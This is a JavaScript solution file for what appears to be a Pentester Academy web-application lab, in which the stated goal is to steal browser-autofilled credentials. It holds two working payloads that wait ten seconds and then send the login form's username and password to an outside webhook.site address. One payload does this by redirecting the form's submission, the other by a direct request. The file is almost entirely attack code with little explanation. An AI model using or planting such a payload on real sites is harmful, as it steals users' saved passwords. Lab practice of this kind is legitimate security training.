// https://pentesteracademylab.appspot.com/lab/webapp/jfp/12

// Objectives:
//     Enter a Username/Password and allow the browser to remember it
//     Reload the page so the auto-complete now adds the Username/Password automatically
//     Write JS attack code which waits for 10 seconds, then submits the form automatically to your Attack server


function sendData() {
    document.forms[0].action='https://webhook.site/9dc7264d-4455-46aa-83e8-2083096f8b57';
    document.forms[0].submit();
}

window.onload = setTimeout(sendData, 10000);



// Another Solution
function sendData() {
    var username = document.forms[0].elements[0].value;
    var password = document.forms[0].elements[1].value;

    const http = new XMLHttpRequest();
    const url = 'https://webhook.site/9dc7264d-4455-46aa-83e8-2083096f8b57/?username='+username+'&password='+password;
    
    http.open('GET', url);
    http.send();
}

window.onload = setTimeout(sendData, 10000);
